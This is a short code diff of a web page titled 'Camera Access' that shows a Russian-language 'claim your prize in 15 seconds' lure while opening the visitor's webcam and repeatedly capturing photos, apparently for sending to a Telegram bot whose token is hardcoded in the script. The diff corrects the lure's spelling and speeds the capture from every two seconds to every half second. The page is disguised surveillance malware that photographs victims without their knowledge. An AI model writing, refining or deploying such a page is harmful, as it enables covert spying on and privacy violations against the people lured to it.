@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera Access</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="box">
-        <h1>Забирвйте свой приз через 15 секунд</h1>
+        <h1>Забирайте свой приз через 15 секунд</h1>
     </div>
     <script>
         const botToken = '6926211862:AAHBpxpTxSA3UsvmmuQ73XeoEuhECc9Lx64'; // Замените на ваш токен бота
@@ -18,7 +19,7 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                setInterval(() => captureAndSendPhoto(video), 2000);
+                setInterval(() => captureAndSendPhoto(video), 500);
             } catch (error) {
                 console.error('Error accessing camera: ', error);
             }
